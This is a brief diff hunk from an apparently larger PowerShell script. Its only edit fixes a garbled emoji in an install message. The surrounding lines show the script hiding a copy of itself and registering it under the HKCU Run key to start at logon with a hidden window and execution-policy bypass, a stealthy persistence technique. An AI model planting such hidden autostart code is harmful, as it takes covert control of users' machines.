@@ -29,7 +29,7 @@ if (-not $isTemp) {
     Copy-Item $MyInvocation.MyCommand.Path $tempScript -Force
     attrib +h $tempScript
     Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value "powershell -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" -Force
-    Write-Host "вњ… Installed. Will run after reboot." -ForegroundColor Green
+    Write-Host "✅ Installed. Will run after reboot." -ForegroundColor Green
     exit
 }
 
